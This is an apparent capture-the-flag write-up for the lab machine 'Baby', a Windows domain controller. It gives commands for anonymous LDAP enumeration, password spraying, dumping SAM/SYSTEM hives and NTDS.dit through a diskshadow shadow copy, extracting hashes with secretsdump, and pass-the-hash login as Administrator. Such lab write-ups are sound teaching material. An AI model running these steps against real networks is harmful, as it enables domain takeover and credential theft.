# Baby Writeup

## 1. Enumeration

### Nmap Scan

```bash
sudo nmap -p- -sC -sV --min-rate 1000 10.129.116.120
```

Domain name: `baby.vl`  
Hostname: `BabyDC.baby.vl`

Add to hosts file:

```bash
echo "10.129.116.120 baby.vl BabyDC.baby.vl" | sudo tee -a /etc/hosts
```

The scan revealed that the target is a Windows Domain Controller with LDAP ports (389, 3268) open.

LDAP (Lightweight Directory Access Protocol) is used to manage directory information in Active Directory environments.  
If misconfigured, it can lead to information disclosure.

---

## 2. User Flag

### LDAP Enumeration

```bash
ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl
```

Usernames were enumerated.  
An exposed password `BabyStart123!` was found in the attributes of one user.

Validate credentials:

```bash
nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
```

Authentication initially failed.

Further enumeration of Distinguished Names:

```bash
ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://BabyDC.baby.vl | grep dn
```

New usernames were discovered:
- Ian Walker
- Caroline Robinson

After updating `users.txt`, authentication succeeded for `Caroline.Robinson`.

The password was expired, so it was reset:

```bash
smbpasswd -U BABY/caroline.robinson -r baby.vl
```

Login via WinRM:

```bash
evil-winrm -i baby.vl -u caroline.robinson -p {NewPassword}
```

User flag obtained.

---

## 3. Root Flag

Check privileges:

```powershell
whoami /priv
```

The account had:

- SeBackupPrivilege
- SeRestorePrivilege

Check group membership:

```powershell
whoami /groups
```

User belonged to **Backup Operators**.

SeBackupPrivilege allows reading any file using backup APIs, bypassing ACL restrictions.

---

### Dumping Registry Hives

```powershell
reg save hklm\sam sam
reg save hklm\system system
```

Download files and extract hashes:

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

The local Administrator hash was obtained, but login failed because this was a local account hash, not a domain account hash.

---

### Dumping NTDS.dit via Volume Shadow Copy

NTDS.dit contains encrypted domain user hashes.  
Since it is locked by Active Directory, a Volume Shadow Copy was created.

Create `backup.txt` for diskshadow:

```
set verbose on
set metadata C:\Windows\Temp\test.cab
set context persistent
add volume C: alias cdrive
create
expose %cdrive% E:
```

Upload and execute:

```powershell
diskshadow /s backup.txt
```

Copy NTDS.dit:

```powershell
robocopy /b E:\Windows\ntds . ntds.dit
```

Download and extract domain hashes:

```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```

Authenticate as domain Administrator:

```bash
evil-winrm -i baby.vl -u Administrator -H {DomainHash}
```

Root shell obtained.  
Root flag captured.

---

## What We Learned

### 1. LDAP Misconfiguration Is Dangerous

Open LDAP allowed anonymous enumeration of domain users and exposed credentials.

**Key Command:**

```bash
ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://baby.vl
```

---

### 2. Backup Operators Is a High-Risk Group

Membership granted SeBackupPrivilege, which allows reading any file via backup APIs, bypassing file ACL restrictions.

**Key Command:**

```powershell
whoami /priv
```

---

### 3. Local vs Domain Authentication Difference

Dumping the SAM database provides local account hashes.  
Domain authentication requires hashes from NTDS.dit.

---

### 4. Volume Shadow Copy Abuse

Since NTDS.dit is locked by Active Directory, creating a Volume Shadow Copy allowed access to a consistent backup.

This is a common privilege escalation technique when SeBackupPrivilege is available.

**Key Command:**

```powershell
diskshadow /s backup.txt
```